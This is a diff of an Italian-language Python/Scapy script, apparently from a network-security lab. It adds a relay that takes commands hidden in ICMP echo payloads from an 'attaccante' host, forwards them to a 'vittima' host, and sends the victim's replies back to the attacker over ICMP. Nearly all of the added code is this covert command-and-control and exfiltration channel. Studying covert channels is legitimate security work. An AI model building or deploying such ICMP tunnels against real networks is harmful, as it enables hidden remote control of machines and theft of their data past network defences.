@@ -9,6 +9,20 @@ import comunication_methods as com
 import sys 
 import datetime
 
+data_received_event = threading.Event() 
+def set_data_received_event():
+    data_received_event.set()
+def wait_data_received_event():
+    data_received_event.wait()
+    data_received_event.clear()
+
+attacker_listening = threading.Event() 
+def set_attacker_listening():
+    attacker_listening.set()
+def wait_attacker_listening():
+    attacker_listening.wait()
+    attacker_listening.clear()
+
 def callback_redirect(packet):
     if packet[IP].src is not ip_attaccante:
         print(f"Il pacchetto non è stato mandato dall'attaccante ma da {packet[IP].src}")
@@ -221,7 +235,125 @@ def def_global_variables():
     pass
 
 #-- Main --# 
-if __name__ == "__main__": 
+def callback_is_attacker_ready(packet):
+    print(f"Packet received:{packet.summary()}")
+    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        if com.READY.encode() in packet[Raw].load:
+            print("L'attaccante è pronto")
+            com.set_pkt_conn_received() 
+
+def is_attacker_ready():
+    args={
+        "filter":f"icmp and src {ip_attaccante}" 
+        #,"count":1 
+        ,"prn":callback_is_attacker_ready 
+        #,"store":True 
+        ,"iface":mymethods.iface_from_IP(ip_attaccante)[1]
+    }
+    com.sniff_packet(args)
+    com.wait_pkt_conn_received() 
+    if com.sniffer.running:
+        com.sniffer.stop() 
+        com.sniffer.join()
+    if com.timeout_timer.is_alive():
+        com.timeout_timer.cancel()
+        send_data_to_attacker(packet_received)
+    return
+
+
+def send_data_to_attacker(data_to_send:list=None):
+    if data_to_send is None:
+        raise ValueError("Dati non corretti")
+    for data in data_to_send:
+        print(f"Sending to attacker {data}")
+        print(datetime.datetime.now())
+        com.send_packet(data[2],ip_attaccante,icmp_seq=data[1])
+
+def callback_wait_dati_from_victim(packet): 
+    global packet_received 
+    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        checksum=mymethods.calc_checksum(packet[Raw].load)
+        #print(f"Payload received:\t{packet[Raw].load}")
+        #print(f"ICMP ID:\t{packet[ICMP].id}")
+        #print(f"Checksum:\t{checksum}")
+        if packet[ICMP].id==checksum:
+            #packet_received.append(packet)
+            packet_received.append([packet[ICMP].id,packet[ICMP].seq,packet[Raw].load])
+            if com.LAST_PACKET.encode() in packet[Raw].load:
+                com.set_pkt_conn_received() 
+
+def send_command_to_victim(command_to_redirect):
+    global packet_received 
+    packet_received=[]
+    ip_vittima="192.168.56.102"
+    print(f"Sendin payload {command_to_redirect} to {ip_vittima}")
+    try:
+        if com.send_packet(command_to_redirect,ip_vittima):
+            args={
+                "filter":f"icmp and src {ip_vittima}" 
+                #,"count":1 
+                ,"prn":callback_wait_dati_from_victim 
+                #,"store":True 
+                ,"iface":mymethods.iface_from_IP(ip_vittima)[1]
+            }
+            com.sniff_packet(args)
+            com.wait_pkt_conn_received() 
+            if com.sniffer.running:
+                com.sniffer.stop() 
+                com.sniffer.join()
+            if com.timeout_timer.is_alive():
+                com.timeout_timer.cancel()
+                print(f"Reply: {ip_vittima} ha risposto")
+                return
+        print(f"No reply: {ip_vittima} non ha risposto")
+    except Exception as e:
+        print(f"send_payload_to_victim: {e}")
+
+def callback_command_from_attaccante(packet):
+    global command_to_redirect
+    global is_received_command
+    print(f"Packet received:{packet.summary()}")
+    if not is_received_command and packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        command_to_redirect=packet[Raw].load
+        checksum=mymethods.calc_checksum(command_to_redirect)
+        print(f"Command to redirect:\t{command_to_redirect}")
+        print(f"Checksum:\t{checksum}")
+        if packet[ICMP].id == checksum:
+            print(f"ID ICMP {packet[ICMP].id} e checksum del payload {checksum} combaciano {packet[ICMP].id==checksum}")
+            is_received_command=True
+            com.set_pkt_conn_received()
+        else:
+            print(f"ID ICMP {packet[ICMP].id} e checksum del payload {checksum} non combaciano {packet[ICMP].id==checksum}")
+
+def parte_2():
+    global ip_attaccante
+    ip_attaccante="192.168.56.1"
+    global command_to_redirect
+    global is_received_command
+    is_received_command=False
+    print(f"Waiting a command from {ip_attaccante}")
+    args={
+        "filter":f"icmp and src {ip_attaccante}" 
+        #,"count":1 
+        ,"prn":callback_command_from_attaccante 
+        #,"store":True 
+        ,"iface":mymethods.iface_from_IP(ip_attaccante)[1]
+    }
+    com.sniff_packet(args, None)
+    com.wait_pkt_conn_received() 
+    if com.sniffer.running:
+        com.sniffer.stop() 
+        com.sniffer.join()
+    if com.timeout_timer.is_alive():
+        com.timeout_timer.cancel()
+        is_received_command=True
+        print(f"Command to redirect:\t{command_to_redirect}")
+        time.sleep(1)
+        print("I slept 1 second")
+        send_command_to_victim(command_to_redirect) 
+        send_data_to_attacker(packet_received)
+
+def parte_1():
     #1) 
     try:
         def_global_variables()
@@ -256,6 +388,10 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"connessione_vittima: {e}")
         exit(1) 
+
+if __name__ == "__main__": 
+    #parte_1()
+    parte_2()
     exit(0)
     try:
         parte_redirect_packet() 
